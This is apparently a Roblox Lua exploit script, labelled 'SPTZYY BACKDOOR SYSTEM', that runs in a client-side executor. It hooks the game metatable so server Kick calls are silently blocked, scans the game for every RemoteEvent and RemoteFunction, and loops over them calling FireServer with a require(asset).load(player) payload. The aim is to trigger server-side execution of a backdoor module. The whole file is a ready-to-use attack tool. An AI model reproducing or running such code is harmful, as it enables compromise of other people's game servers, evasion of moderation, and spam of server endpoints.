-- [[ SPTZYY ULTIMATE ALL-IN-ONE SYSTEM ]] --
-- Fitur: Brute Force, Remote Finder, Anti-Kick (Real Bypass), Auto-Scroll Log

local Players = game:GetService("Players")
local lp = Players.LocalPlayer

-- ==========================================
-- LOGIKA ANTI-KICK (SILENT PROTECT)
-- ==========================================
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if tostring(method) == "Kick" or tostring(method) == "kick" then
        warn("🛡️ SPTZYY PROTECT: Perintah Kick Diblokir!")
        return nil 
    end
    return old(self, ...)
end)
setreadonly(mt, true)

-- ==========================================
-- UI SETUP (Satu GUI Utama)
-- ==========================================
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "Sptzyy_Ultimate_Hub"
ScreenGui.ResetOnSpawn = false

local SupportIcon = Instance.new("ImageButton", ScreenGui)
SupportIcon.Size = UDim2.new(0, 60, 0, 60)
SupportIcon.Position = UDim2.new(0.05, 0, 0.4, 0)
SupportIcon.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
SupportIcon.Image = "rbxassetid://6031280227"
SupportIcon.Draggable = true
SupportIcon.Active = true
Instance.new("UICorner", SupportIcon).CornerRadius = UDim.new(1, 0)

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 520, 0, 360)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
MainFrame.Visible = false
Instance.new("UICorner", MainFrame)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.Text = "SPTZYY BACKDOOR SYSTEM - ANTI KICK ACTIVE"
Title.TextColor3 = Color3.fromRGB(0, 255, 130)
Title.Font = Enum.Font.Code
Title.TextSize = 14
Instance.new("UICorner", Title)

-- Container Kiri (Console Log)
local LeftFrame = Instance.new("Frame", MainFrame)
LeftFrame.Size = UDim2.new(0.55, -10, 0.75, 0)
LeftFrame.Position = UDim2.new(0.02, 0, 0.15, 0)
LeftFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Instance.new("UICorner", LeftFrame)

local LogScroll = Instance.new("ScrollingFrame", LeftFrame)
LogScroll.Size = UDim2.new(0.95, 0, 0.95, 0)
LogScroll.Position = UDim2.new(0.025, 0, 0.025, 0)
LogScroll.BackgroundTransparency = 1
LogScroll.CanvasSize = UDim2.new(0, 0, 10, 0)
LogScroll.ScrollBarThickness = 2
Instance.new("UIListLayout", LogScroll)

-- Container Kanan (Remote List)
local RightFrame = Instance.new("Frame", MainFrame)
RightFrame.Size = UDim2.new(0.4, -10, 0.75, 0)
RightFrame.Position = UDim2.new(0.58, 0, 0.15, 0)
RightFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Instance.new("UICorner", RightFrame)

local FinderScroll = Instance.new("ScrollingFrame", RightFrame)
FinderScroll.Size = UDim2.new(0.95, 0, 0.95, 0)
FinderScroll.Position = UDim2.new(0.025, 0, 0.025, 0)
FinderScroll.BackgroundTransparency = 1
FinderScroll.ScrollBarThickness = 2
Instance.new("UIListLayout", FinderScroll).Padding = UDim.new(0, 3)

-- ==========================================
-- FUNGSI LOGIKA
-- ==========================================
_G.BruteActive = false
local FoundRemotes = {}

local function AddLog(txt, col)
    local l = Instance.new("TextLabel", LogScroll)
    l.Size = UDim2.new(1, 0, 0, 16)
    l.BackgroundTransparency = 1
    l.Text = "> " .. txt
    l.TextColor3 = col or Color3.new(1,1,1)
    l.Font = Enum.Font.Code
    l.TextSize = 10
    l.TextXAlignment = Enum.TextXAlignment.Left
    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.AbsoluteCanvasSize.Y)
end

local function Scan()
    for _, c in pairs(FinderScroll:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
    FoundRemotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(FoundRemotes, v)
            local b = Instance.new("TextButton", FinderScroll)
            b.Size = UDim2.new(1, 0, 0, 25)
            b.Text = "[" .. v.ClassName:sub(1,3) .. "] " .. v.Name
            b.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            b.TextColor3 = Color3.new(0.8, 0.8, 0.8)
            b.Font = Enum.Font.SourceSans
            b.TextSize = 11
            Instance.new("UICorner", b)
        end
    end
    FinderScroll.CanvasSize = UDim2.new(0, 0, 0, #FoundRemotes * 28)
    AddLog("Scanner: " .. #FoundRemotes .. " Remotes Cached.", Color3.new(0,1,1))
end

-- ==========================================
-- TOMBOL KONTROL (Bottom Row)
-- ==========================================
local function CreateBtn(t, pos, col, f)
    local b = Instance.new("TextButton", MainFrame)
    b.Size = UDim2.new(0.3, 0, 0, 35)
    b.Position = pos
    b.Text = t
    b.BackgroundColor3 = col
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 12
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(f)
end

CreateBtn("START BRUTE", UDim2.new(0.02, 0, 0.91, 0), Color3.fromRGB(0, 130, 0), function()
    if _G.BruteActive then return end
    _G.BruteActive = true
    AddLog("BRUTE FORCE INITIALIZED...", Color3.new(1,1,0))
    task.spawn(function()
        while _G.BruteActive do
            for _, r in pairs(FoundRemotes) do
                if not _G.BruteActive then break end
                AddLog("Bruting: " .. r.Name, Color3.fromRGB(180, 180, 180))
                pcall(function() r:FireServer("require(6031280227).load('"..lp.Name.."')") end)
                task.wait(0.05)
            end
            task.wait(0.1)
        end
    end)
end)

CreateBtn("STOP", UDim2.new(0.35, 0, 0.91, 0), Color3.fromRGB(130, 0, 0), function()
    _G.BruteActive = false
    AddLog("PROCESS TERMINATED.", Color3.new(1,0,0))
end)

CreateBtn("RE-SCAN MAP", UDim2.new(0.68, 0, 0.91, 0), Color3.fromRGB(0, 80, 180), Scan)

-- Open/Close
SupportIcon.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
    if MainFrame.Visible then Scan() end
end)

AddLog("SYSTEM READY. ANTI-KICK ENABLED.", Color3.new(0,1,0))
